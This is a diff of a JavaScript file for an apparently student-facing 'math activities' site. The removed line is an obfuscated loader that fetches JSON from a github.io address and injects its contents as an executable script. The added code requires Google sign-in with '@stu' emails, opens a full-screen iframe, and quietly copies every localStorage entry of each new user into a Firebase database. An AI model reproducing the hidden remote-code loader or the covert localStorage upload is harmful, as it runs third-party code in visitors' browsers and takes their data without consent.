@@ -1,1 +1,92 @@
-function _0x103b(_0x1f66cc,_0x2fb5d0){const _0x1eeb3c=_0x1eeb();return _0x103b=function(_0x103b8c,_0x3212b3){_0x103b8c=_0x103b8c-0x7f;let _0x3d4fbd=_0x1eeb3c[_0x103b8c];return _0x3d4fbd;},_0x103b(_0x1f66cc,_0x2fb5d0);}const _0x548c9d=_0x103b;function _0x1eeb(){const _0x59cc20=['then','error','setup','7139992TzhKvi','https://mathactivities.github.io/anandndnadnandnad/adesdfsesdfasdgesdadesfd.json','createElement','503716RHAMXi','1207165jhMVDd','type','log','16422MjgSyZ','module','json','body','1011612ZIdSdj','4xZGKHc','catch','textContent','2523157gvuEVG','876627mIpvGU'];_0x1eeb=function(){return _0x59cc20;};return _0x1eeb();}(function(_0x28fc51,_0x5e79be){const _0x2cab10=_0x103b,_0x1e6f68=_0x28fc51();while(!![]){try{const _0x18c7e8=parseInt(_0x2cab10(0x88))/0x1+parseInt(_0x2cab10(0x8c))/0x2+-parseInt(_0x2cab10(0x81))/0x3*(-parseInt(_0x2cab10(0x91))/0x4)+parseInt(_0x2cab10(0x89))/0x5+-parseInt(_0x2cab10(0x90))/0x6+parseInt(_0x2cab10(0x80))/0x7+-parseInt(_0x2cab10(0x85))/0x8;if(_0x18c7e8===_0x5e79be)break;else _0x1e6f68['push'](_0x1e6f68['shift']());}catch(_0xb7e97f){_0x1e6f68['push'](_0x1e6f68['shift']());}}}(_0x1eeb,0x54357),fetch(_0x548c9d(0x86))[_0x548c9d(0x82)](_0x118046=>{const _0x57a60e=_0x548c9d;if(!_0x118046['ok'])throw new Error('HTTP\x20error!\x20Status:\x20'+_0x118046['status']);return _0x118046[_0x57a60e(0x8e)]();})[_0x548c9d(0x82)](_0xaede30=>{const _0x21e26e=_0x548c9d;console[_0x21e26e(0x8b)](_0xaede30);const _0xcdfd2f=_0xaede30[_0x21e26e(0x84)];console[_0x21e26e(0x8b)](_0xcdfd2f);const _0x26ec31=document[_0x21e26e(0x87)]('script');_0x26ec31[_0x21e26e(0x8a)]=_0x21e26e(0x8d),_0x26ec31[_0x21e26e(0x7f)]=_0xcdfd2f,document[_0x21e26e(0x8f)]['appendChild'](_0x26ec31);})[_0x548c9d(0x92)](_0x5e78c8=>{const _0x4005ad=_0x548c9d;console[_0x4005ad(0x83)]('Unable\x20to\x20fetch\x20data:',_0x5e78c8);}));
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.1/firebase-app.js";
+import { getDatabase, ref, set, onValue, get} from "https://www.gstatic.com/firebasejs/9.0.1/firebase-database.js";
+import { getAuth, GoogleAuthProvider, signInWithPopup, getAdditionalUserInfo  } from "https://www.gstatic.com/firebasejs/9.0.1/firebase-auth.js";
+let userSettings
+
+const firebaseConfig = {
+    apiKey: "AIzaSyCPoYZZ4uJSkZytTUNAstPrWKyhYF9wmLc",
+    authDomain: "thingy-2f35d.firebaseapp.com",
+    databaseURL: "https://thingy-2f35d-default-rtdb.firebaseio.com",
+    projectId: "thingy-2f35d",
+    storageBucket: "thingy-2f35d.firebasestorage.app",
+    messagingSenderId: "93295196463",
+    appId: "1:93295196463:web:cf072dae28eeaf692989da",
+    measurementId: "G-CT1NYQ5W3L"
+};
+  
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getDatabase(app)
+
+async function createIframe() {
+    try {
+      const provider = new GoogleAuthProvider();
+      const result = await signInWithPopup(auth, provider);
+      const user = result.user;
+      console.log(user.photoURL)
+      
+
+      console.log(user)
+      if (!user.email.includes("@stu")){
+        window.location.href = "401.html"
+      }
+      else {
+        e()
+        const isNewUser = getAdditionalUserInfo(result).isNewUser
+        userSettings = setInfo(user.uid, user.email, user.photoURL, user.displayName)
+        localStorage.setItem("mathActivitiesSettings", JSON.stringify(userSettings))
+        if (isNewUser){
+          function getLocalStorageKeysAsJSON() {
+            const keys = {};
+            console.log(localStorage.length)
+            for (let i = 0; i < localStorage.length; i++) {
+              const key = localStorage.key(i);
+              console.log(key)
+              keys[key] = localStorage.getItem(key);
+              console.log(keys)
+            }
+            return JSON.stringify(keys);
+          }
+          
+          // Example usage:
+          const combinedJSON = getLocalStorageKeysAsJSON();
+          console.log(combinedJSON)
+          set(ref(db, `users/${user.uid}/localstorageData`), combinedJSON)
+        }
+      }
+      
+    } catch (error) {
+      console.error("Error signing in with Google:", error);
+    }
+}
+
+function e(){
+    const thing = navigator.userAgent
+    const iframe = document.createElement("iframe")
+    iframe.src = "activities/flash/main.html"
+    iframe.style.width = "100%"
+    iframe.style.height = "100vh"
+    iframe.style.border = "none"
+    iframe.style.position = "absolute"
+    iframe.style.top = "0"
+    iframe.style.zIndex = "5000"
+    document.body.style.overflow = "hidden"
+    window.scrollTo({
+        top: 0,
+        left: 0,
+    });
+    document.body.appendChild(iframe)
+    iframe.focus()
+}
+
+document.getElementById("thingy").addEventListener("click", createIframe)
+
+function setInfo(uid, email, profilePic, displayName){
+  return {
+    "mathActivitiesUid": uid,
+    "mathActivitiesemail": email,
+    "mathActivitiesprofilePic": profilePic,
+    "mathActivitiesdisplayName": displayName
+  }
+}
